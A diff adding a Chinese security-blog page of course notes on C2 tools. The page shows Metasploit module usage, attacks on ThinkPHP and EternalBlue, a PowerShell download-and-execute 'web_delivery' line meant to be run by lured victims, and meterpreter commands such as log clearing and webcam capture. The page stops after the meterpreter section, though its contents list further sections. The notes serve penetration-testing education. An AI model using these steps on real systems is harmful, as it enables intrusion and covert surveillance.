@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hexo">
+<title>C2 工具 - swfk 的安全笔记</title>
+<meta name="description" content="Cobalt Strike、Metasploit、Sliver 等常见 C2 框架的功能、上线流程与流量特征认知。">
+<meta name="author" content="swfk2154">
+<meta name="keywords" content="AI安全, 网络安全, 大模型安全, LLM安全, 渗透测试, 安全运营">
+<meta name="theme-color" id="theme-color" content="#f8f7f4">
+<link rel="icon" type="image/svg+xml" href="/images/clay-avatar.svg">
+<link rel="apple-touch-icon" href="/icon.png">
+<link rel="canonical" href="https://blogbu2154.site/c2-frameworks/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="C2 工具 - swfk 的安全笔记">
+<meta property="og:description" content="Cobalt Strike、Metasploit、Sliver 等常见 C2 框架的功能、上线流程与流量特征认知。">
+<meta property="og:url" content="https://blogbu2154.site/c2-frameworks/">
+<meta property="og:site_name" content="swfk 的安全笔记">
+<meta property="og:image" content="/medias/featureimages/10.jpg">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/atom+xml" title="swfk 的安全笔记" href="/atom.xml">
+<link rel="stylesheet" href="/css/clay.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+
+<script>
+  // 尽早恢复主题，避免首屏闪烁
+  (function () {
+    try {
+      var t = localStorage.getItem('clay-theme') ||
+        (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+      document.documentElement.dataset.theme = t;
+    } catch (e) {
+      document.documentElement.dataset.theme = 'light';
+    }
+  })();
+</script>
+
+
+<body class="">
+  <a class="skip-link" href="#main">跳到正文</a>
+  <header class="site-nav">
+  <nav class="site-nav__pill" aria-label="主导航">
+    
+      
+        <a href="/" class="">首页</a>
+      
+        <a href="/archives" class="">归档</a>
+      
+        <a href="/categories" class="">分类</a>
+      
+        <a href="/tags" class="">标签</a>
+      
+        <a href="/about" class="">关于</a>
+      
+    
+    
+      <button type="button" class="site-nav__icon" data-search-open aria-label="站内搜索">
+        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </button>
+      <a class="site-nav__icon" href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+        <svg class="icon-github" viewBox="0 0 24 24" width="26" height="26" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+      </a>
+    
+    <button type="button" class="site-nav__icon theme-toggle" data-theme-toggle aria-label="切换主题">
+      <svg class="theme-toggle__moon" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg>
+      <svg class="theme-toggle__sun" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+    </button>
+  </nav>
+</header>
+
+  <main id="main">
+    
+<div class="reading-progress" aria-hidden="true"><span data-reading-progress></span></div>
+<article class="article article--toc">
+  <div class="article__body">
+    
+
+<aside class="article__aside">
+  <div class="toc-box">
+    <div class="toc-box__title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#metasploit"><span class="toc-text">metasploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD"><span class="toc-text">功能</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-text">安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kali%E8%87%AA%E5%B8%A6"><span class="toc-text">kali自带</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%AE%89%E8%A3%85"><span class="toc-text">Linux 云服务器 安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85"><span class="toc-text">windows 系统安装</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msfconsole%E4%BD%BF%E7%94%A8"><span class="toc-text">msfconsole使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-text">步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-portscan"><span class="toc-text">举例 1 : 端口扫描  portscan</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97"><span class="toc-text">1  搜索模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-text">2  使用模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9F%A5%E7%9C%8B%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="toc-text">3  查看配置项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%A0%B9%E6%8D%AE%E5%AE%9E%E9%99%85%E9%9C%80%E6%B1%82%E9%85%8D%E7%BD%AE%E9%80%89%E9%A1%B9"><span class="toc-text">4  根据实际需求配置选项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%9D%97"><span class="toc-text">5  运行模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-2-%EF%BC%9A%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E6%8E%A2%E6%B5%8B-arp-sweep"><span class="toc-text">举例 2 ：内网存活探测  arp  sweep</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-3-%EF%BC%9A%E7%88%86%E7%A0%B4-ftp"><span class="toc-text">举例 3 ：爆破 ftp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-4%EF%BC%9A%E6%94%BB%E5%87%BB-thinkphp"><span class="toc-text">举例 4：攻击 thinkphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-5-%EF%BC%9A%E6%94%BB%E5%87%BB%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E"><span class="toc-text">举例 5 ：攻击永恒之蓝漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-6%EF%BC%9A-web-delivery"><span class="toc-text">举例 6： web_delivery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python"><span class="toc-text">python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell"><span class="toc-text">powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jobs-%E6%9F%A5%E7%9C%8B%E6%94%BE%E5%9C%A8%E5%90%8E%E5%8F%B0%E7%9A%84%E7%9B%91%E5%90%AC"><span class="toc-text">jobs 查看放在后台的监听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sessions-%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%94%BE%E5%9C%A8%E5%90%8E%E5%8F%B0%E7%9A%84%E4%BC%9A%E8%AF%9D"><span class="toc-text">sessions 可以看到放在后台的会话</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#meterpreter"><span class="toc-text">meterpreter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msfvenom"><span class="toc-text">msfvenom</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90-windows-%E6%9C%A8%E9%A9%AC"><span class="toc-text">生成 windows 木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msfconsole-%E5%BC%80%E7%9B%91%E5%90%AC"><span class="toc-text">msfconsole 开监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF"><span class="toc-text">上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90-linux-%E6%9C%A8%E9%A9%AC"><span class="toc-text">生成 linux 木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#staged-payload-%E5%92%8C-stageless-payload"><span class="toc-text">staged payload 和 stageless payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="toc-text">区别：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%EF%BC%9ARCE-%E6%BC%8F%E6%B4%9E-meterpreter"><span class="toc-text">操作：RCE 漏洞 meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%94%BB%E5%87%BB%E6%9C%BA%E7%94%9F%E6%88%90-elf-%E6%9C%A8%E9%A9%AC"><span class="toc-text">1  攻击机生成 elf 木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E6%9C%BA%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC"><span class="toc-text">2  攻击机开启监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E6%9C%BA%E5%BC%80http%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5"><span class="toc-text">3  攻击机开http下载链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E-%EF%BC%88-thinkphp-5-0-23-rce-%EF%BC%89"><span class="toc-text">4  攻击漏洞 （ thinkphp 5.0.23 rce ）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%B8%8A%E7%BA%BF"><span class="toc-text">5 上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CobalStrike"><span class="toc-text">CobalStrike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Server-%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">Server 服务端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Client-%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">Client 客户端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Listenter-%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-text">Listenter 监听器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6"><span class="toc-text">Payload 生成木马文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stager-payload-stageless-payload"><span class="toc-text">stager payload &#x2F; stageless payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML-application"><span class="toc-text">HTML application</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTA-%E6%98%AFwindows-html%E7%9A%84"><span class="toc-text">HTA 是windows html的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E7%A7%8D%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-text">一种应用程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%AF%E6%8C%81%E5%9C%A8-hta-%E9%87%8C%E5%B0%81%E8%A3%85-vbs-%E8%84%9A%E6%9C%AC"><span class="toc-text">支持在 hta 里封装 vbs 脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vbs-%E8%84%9A%E6%9C%AC%E5%86%8D%E8%A7%A6%E5%8F%91-powershell"><span class="toc-text">vbs 脚本再触发 powershell </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-delivery"><span class="toc-text">web delivery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#office-%E5%AE%8F%E6%9C%A8%E9%A9%AC"><span class="toc-text">office 宏木马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#beacon"><span class="toc-text">beacon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#interact-%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-text">interact  执行系统命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-text">sleep</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-text">文件浏览器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8"><span class="toc-text">进程列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE"><span class="toc-text">屏幕截图</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vnc"><span class="toc-text">vnc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%80%E5%87%BA%E5%92%8C%E5%88%A0%E9%99%A4"><span class="toc-text">退出和删除</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cobaltstrike-%E5%92%8C-meterpreter"><span class="toc-text">cobaltstrike 和 meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-meterpreter-%E8%BD%AC-cs-beacon"><span class="toc-text">msf meterpreter 转 cs beacon</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%B8%8A%E7%BA%BF-meterpreter"><span class="toc-text">1 上线 meterpreter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-CS%E5%88%9B%E5%BB%BAHTTP%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-text">2 CS创建HTTP监听器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-msfconsole%E4%BD%BF%E7%94%A8%E6%A8%A1%E5%9D%97exploit"><span class="toc-text">3 msfconsole使用模块exploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#windows-local-payload-inject"><span class="toc-text">&#x2F;windows&#x2F;local&#x2F;payload_inject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-cs-%E5%8D%B3%E5%8F%AF%E6%94%B6%E5%88%B0-beacon"><span class="toc-text">4 cs 即可收到 beacon</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cs-beacon-%E8%BD%AC-msf-meterpreter"><span class="toc-text">cs beacon 转 msf meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%B8%8A%E7%BA%BF-beacon"><span class="toc-text">1  上线 beacon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-msfconsole-%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC"><span class="toc-text">2  msfconsole 开启监听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-cs-%E5%88%9B%E5%BB%BA%E5%A4%96%E9%83%A8%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-text">3  cs 创建外部监听器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E9%80%89%E6%8B%A9%E8%A6%81%E5%8F%91%E9%80%81%E7%9A%84-beacon%EF%BC%8C"><span class="toc-text">4  选择要发送的 beacon，</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#spawn-%E5%B9%B6%E9%80%89%E6%8B%A9%E5%88%9A%E5%88%9A%E7%9A%84%E5%A4%96%E9%83%A8%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-text">spawn 并选择刚刚的外部监听器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-msf-%E6%94%B6%E5%88%B0-meterpreter"><span class="toc-text">5  msf 收到 meterpreter</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CNA-%E6%8F%92%E4%BB%B6"><span class="toc-text">CNA 插件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E6%8F%92%E4%BB%B6-LSTAR"><span class="toc-text">综合渗透插件 LSTAR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CrossC2"><span class="toc-text">CrossC2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AE%89%E8%A3%85%E7%BC%96%E8%BE%91"><span class="toc-text">1 安装编辑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BE%9D%E6%AC%A1%E5%AF%BC%E5%85%A5"><span class="toc-text">2 依次导入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%8A%8A-teamserver-%E4%B8%8A%E7%9A%84-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-text">3  把 teamserver 上的 隐藏文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cobaltstrike-beacon-keys"><span class="toc-text">.cobaltstrike.beacon_keys</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E5%88%B0-cobaltstrike-%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%AD"><span class="toc-text">传输到 cobaltstrike 客户端文件夹中</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-%EF%BC%88%E7%94%9F%E6%88%90linux%E6%9C%A8%E9%A9%AC%E5%B9%B6%E4%B8%8A%E7%BA%BF%EF%BC%89"><span class="toc-text">使用 （生成linux木马并上线）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-cs-%E4%B8%AD%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA-https-%E7%9A%84%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-text">1  cs 中创建一个 https 的监听器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8-crossC2-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-text">2  使用 crossC2 生成木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E7%9A%84%E6%9C%A8%E9%A9%AC%E4%BF%9D%E5%AD%98%E4%BD%8D%E7%BD%AE%E5%9C%A8"><span class="toc-text">生成的木马保存位置在</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cobaltstrike-%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%AD"><span class="toc-text">cobaltstrike 的客户端文件夹中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%8A%8A-elf-%E6%9C%A8%E9%A9%AC%E4%BC%A0%E7%BB%99-linux-%E9%9D%B6%E6%9C%BA"><span class="toc-text">3  把 elf 木马传给 linux 靶机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B9%B6%E8%BF%90%E8%A1%8C%EF%BC%8C%E5%8D%B3%E5%8F%AF%E4%B8%8A%E7%BA%BF-linux-beacon"><span class="toc-text">并运行，即可上线 linux beacon</span></a></li></ol></li></ol></li></ol>
+  </div>
+</aside>
+
+
+    <div class="article__main">
+      <header class="article__header reveal">
+        <p class="eyebrow">网络安全</p>
+        <h1>C2 工具</h1>
+        <div class="post-meta">
+          <time datetime="2026-01-19">2026-01-19</time>
+          
+            <span>更新于 2026-08-29</span>
+          
+        </div>
+      </header>
+      
+        <figure class="article__cover reveal"><img src="/medias/featureimages/10.jpg" alt="C2 工具" loading="eager" onerror="this.parentElement.style.display='none'"></figure>
+      
+      <div class="post-content reveal">
+        <blockquote>
+<p>本篇整理自我的语雀学习笔记（课堂学习与实操记录），已转为纯文字版并按博客格式排版。</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> 官网：  <a target="_blank" rel="noopener" href="https://www.metasploit.com/">https://www.metasploit.com/</a></p>
+<p> 所属企业：  <a target="_blank" rel="noopener" href="https://www.rapid7.com/">https://www.rapid7.com/</a></p>
+<p>c2工具，简称 msf，kali自带，windows 和 云服务器均可安装</p>
+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ol>
+<li>msfconsole：metasploit 的命令行终端</li>
+<li>msfvenom：metasploit 生成 payload 及可执行程序木马的工具</li>
+<li>modules：保存了 metasploit 支持的所有模块</li>
+</ol>
+<ul>
+<li>auxiliary 辅助模块 （信息收集、端口扫描、服务爆破、漏洞检测）</li>
+<li>exploits 漏洞利用</li>
+<li>payloads 攻击载荷</li>
+<li>post 后渗透 （代理隧道、横向渗透、 权限维持、提权、内网信息收集 、 痕迹清除等）</li>
+<li>encoders 编码器 &#x2F; evasion 逃避 &#x2F; nops 空 （绕过杀毒软件 、绕过edr）</li>
+</ul>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="kali自带"><a href="#kali自带" class="headerlink" title="kali自带"></a>kali自带</h3><h3 id="Linux-云服务器-安装"><a href="#Linux-云服务器-安装" class="headerlink" title="Linux 云服务器 安装"></a>Linux 云服务器 安装</h3><p><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</code></p>
+<h3 id="windows-系统安装"><a href="#windows-系统安装" class="headerlink" title="windows 系统安装"></a>windows 系统安装</h3><p> <code>https://windows.metasploit.com/metasploitframework-latest.msi  </code></p>
+<h2 id="msfconsole使用"><a href="#msfconsole使用" class="headerlink" title="msfconsole使用"></a>msfconsole使用</h2><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul>
+<li><strong>使用模块 [use] ( 使用模块之前一般需要搜索[search]模块  )</strong></li>
+<li><strong>配置模块 [set] ( 配置模块之前一般需要查看[show]配置项  )</strong></li>
+<li><strong>运行模块 [run]</strong></li>
+</ul>
+<h2 id="举例-1-端口扫描-portscan"><a href="#举例-1-端口扫描-portscan" class="headerlink" title="举例 1 : 端口扫描  portscan"></a>举例 1 : 端口扫描  <strong>portscan</strong></h2><h3 id="1-搜索模块"><a href="#1-搜索模块" class="headerlink" title="1  搜索模块"></a>1  搜索模块</h3><p><code>**search   portscan**</code></p>
+<h3 id="2-使用模块"><a href="#2-使用模块" class="headerlink" title="2  使用模块"></a>2  使用模块</h3><p><code>use   模块的ID</code>或  <code>use   模块的全名</code></p>
+<h3 id="3-查看配置项"><a href="#3-查看配置项" class="headerlink" title="3  查看配置项"></a>3  查看配置项</h3><p><code>show   options   show 可以不写</code></p>
+<h3 id="4-根据实际需求配置选项"><a href="#4-根据实际需求配置选项" class="headerlink" title="4  根据实际需求配置选项"></a>4  根据实际需求配置选项</h3><p> <code>set    选项名    选项值  </code></p>
+<p>⚠️选项名大小写不敏感，可以使用 <code>**TAB**</code> 补全</p>
+<h3 id="5-运行模块"><a href="#5-运行模块" class="headerlink" title="5  运行模块"></a>5  运行模块</h3><h2 id="举例-2-：内网存活探测-arp-sweep"><a href="#举例-2-：内网存活探测-arp-sweep" class="headerlink" title="举例 2 ：内网存活探测  arp  sweep"></a>举例 2 ：内网存活探测  <code>arp  sweep</code></h2><p> 先搜索、再使用</p>
+<p><code>search  arp  sweep</code></p>
+<p> 查看配置、设置选项</p>
+<p> 运行模块</p>
+<h2 id="举例-3-：爆破-ftp"><a href="#举例-3-：爆破-ftp" class="headerlink" title="举例 3 ：爆破 ftp"></a>举例 3 ：爆破 ftp</h2><p>先搜索，再使用</p>
+<p><code>search  ftp  login</code></p>
+<p> 设置选项</p>
+<p><code>python -m pyftpdlib -p 21 -u sd -P 123456</code></p>
+<p> 运行模块</p>
+<h2 id="举例-4：攻击-thinkphp"><a href="#举例-4：攻击-thinkphp" class="headerlink" title="举例 4：攻击 thinkphp"></a>举例 4：攻击 thinkphp</h2><p> 搜索并使用</p>
+<p><code>search  thinkphp</code></p>
+<p> 重要配置项</p>
+<p>运行模块 ，如果攻击成功，会进入 <code>**meterpreter**</code> 命令终端</p>
+<h2 id="举例-5-：攻击永恒之蓝漏洞"><a href="#举例-5-：攻击永恒之蓝漏洞" class="headerlink" title="举例 5 ：攻击永恒之蓝漏洞"></a>举例 5 ：攻击永恒之蓝漏洞</h2><p>搜索并使用</p>
+<p><code>search  ms17_010</code></p>
+<p>设置选项</p>
+<p>运行模块 ，如果攻击成功，会进入 <code>**meterpreter**</code> 命令终端</p>
+<h2 id="举例-6：-web-delivery"><a href="#举例-6：-web-delivery" class="headerlink" title="举例 6： web_delivery"></a>举例 6： web_delivery</h2><p> <strong>无文件落地</strong>，类似于之前说的 powershell **远程加载执行脚本  **</p>
+<p><code>**powershell -ep bypass -c &quot;iex (new-object system.net.webclient).downloadstring(&#39;ps1文件的下载网址&#39;);脚本运行的方法&quot;**</code></p>
+<p><code>search  web_delivery</code></p>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>设置配置</p>
+<p>运行后，就会生成一个（python）命令，诱导受害者运行命令（或通过 rce 漏洞执行命令）</p>
+<p>受害者运行链接</p>
+<p>攻击者即可收到 <code>meterpreter</code> （默认放在后台），需要使用 <code>sessions</code> 打开后台才能看到</p>
+<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p><code>show  targets</code></p>
+<p>目标没有python，可以选其他语言</p>
+<p>设置 target 为其他脚本</p>
+<p><code>set target  ID</code></p>
+<p> 需要替换payload</p>
+<p><code>set payload windows/x64/meterpreter/reverse_tcp</code></p>
+<h4 id="jobs-查看放在后台的监听"><a href="#jobs-查看放在后台的监听" class="headerlink" title="jobs 查看放在后台的监听"></a>jobs 查看放在后台的监听</h4><p>可以使用 <code>jobs</code> 查看放在后台的监听，使用<code> jobs -K</code> 能 够删除放在后台的所有监听</p>
+<p> 运行后会出现 <code>powershell</code> 命令。目标执行即可上线<code> meterpreter session</code></p>
+<h4 id="sessions-可以看到放在后台的会话"><a href="#sessions-可以看到放在后台的会话" class="headerlink" title="sessions 可以看到放在后台的会话"></a>sessions 可以看到放在后台的会话</h4><p>sessions 会话ID 可进入后台的会话 ， bg 可以把当前的会话放在后台</p>
+<h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>msf 的后渗透命令行，常见功能</p>
+<pre><code class="hljs plain">help          查看帮助信息
+bg            放在后台
+exit          退出
+cat           查看文件
+cp            复制
+upload        上传文件
+download      下载文件
+arp           查看arp缓存
+ifconfig      查看ip
+clearev       清除日志
+execute       执行系统命令
+getenv        查看环境变量
+getprivs      查看目标权限
+getuid        获取当前用户
+sysinfo       查看目标系统
+screenshot    截图
+webcam_snap   拍照
+shell         打开目标命令行</code></pre>
+
+<ul>
+<li>乱码的原因：cmd 默认是 gbk 编码，而 bash 默认是 utf-8</li>
+<li>修复乱码：cmd 中执行命令 <code>chcp 65001 </code></li>
+</ul>
+<p><code>chcp 936</code></p>
